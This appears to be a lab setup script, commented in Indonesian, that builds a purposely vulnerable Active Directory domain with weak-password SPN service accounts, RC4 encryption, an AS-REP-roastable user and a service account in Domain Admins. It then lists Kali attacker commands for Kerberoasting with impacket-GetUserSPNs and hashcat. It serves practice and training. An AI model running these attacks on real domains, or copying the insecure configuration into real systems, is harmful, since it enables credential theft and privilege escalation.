# Service account #1 - SQL Server (password medium)
New-ADUser -Name "svc_sql" `
    -SamAccountName "svc_sql" `
    -UserPrincipalName "svc_sql@corp.local" `
    -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

# Service account #2 - Web app (password lemah, jackpot)
New-ADUser -Name "svc_web" `
    -SamAccountName "svc_web" `
    -UserPrincipalName "svc_web@corp.local" `
    -AccountPassword (ConvertTo-SecureString "Welcome1" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

# Service account #3 - Backup (lebih kuat, untuk tantangan)
New-ADUser -Name "svc_backup" `
    -SamAccountName "svc_backup" `
    -UserPrincipalName "svc_backup@corp.local" `
    -AccountPassword (ConvertTo-SecureString "Pa55w0rd!Backup#2024" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true



# SPN untuk SQL Server
setspn -A MSSQLSvc/sql01.corp.local:1433 svc_sql
setspn -A MSSQLSvc/sql01.corp.local svc_sql

# SPN untuk Web
setspn -A HTTP/web01.corp.local svc_web
setspn -A HTTP/web01 svc_web

# SPN untuk Backup
setspn -A BACKUP/backup01.corp.local svc_backup

# Verifikasi
setspn -T corp.local -Q */* | findstr svc_


# Bikin svc_admin yang jadi Domain Admin (anti-pattern di production, tapi realistis di lab)
New-ADUser -Name "svc_admin" `
    -SamAccountName "svc_admin" `
    -UserPrincipalName "svc_admin@corp.local" `
    -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

setspn -A SERVICE/admin01.corp.local svc_admin
Add-ADGroupMember -Identity "Domain Admins" -Members svc_admin


New-ADUser -Name "John Doe" `
    -SamAccountName "jdoe" `
    -UserPrincipalName "jdoe@corp.local" `
    -AccountPassword (ConvertTo-SecureString "User@123" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

# Set msDS-SupportedEncryptionTypes ke RC4 (0x4)
Set-ADUser -Identity svc_sql -Replace @{"msDS-SupportedEncryptionTypes"=4}
Set-ADUser -Identity svc_web -Replace @{"msDS-SupportedEncryptionTypes"=4}

New-ADUser -Name "Alice" `
    -SamAccountName "alice" `
    -AccountPassword (ConvertTo-SecureString "Spring2024" -AsPlainText -Force) `
    -Enabled $true

Set-ADAccountControl -Identity alice -DoesNotRequirePreAuth $true

# Default sudah open setelah promote DC, tapi cek:
Get-NetFirewallRule -DisplayGroup "Active Directory Domain Services" | 
    Where Enabled -eq True | Select DisplayName,Profile

# Dari Kali, sync ke DC
sudo ntpdate 10.10.10.10
# atau
sudo rdate -n 10.10.10.10

Dari Kali (attacker), jalankan:

# 1. Cek konektivitas Kerberos
nmap -p 88,389,445 10.10.10.10

# 2. Enum SPN tanpa kredensial (anonymous bind, biasanya gagal)
impacket-GetUserSPNs corp.local/ -dc-ip 10.10.10.10

# 3. Enum SPN dengan kredensial low-priv jdoe
impacket-GetUserSPNs corp.local/jdoe:'User@123' -dc-ip 10.10.10.10

# 4. Request TGS (the actual roast)
impacket-GetUserSPNs corp.local/jdoe:'User@123' -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# 5. Crack
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
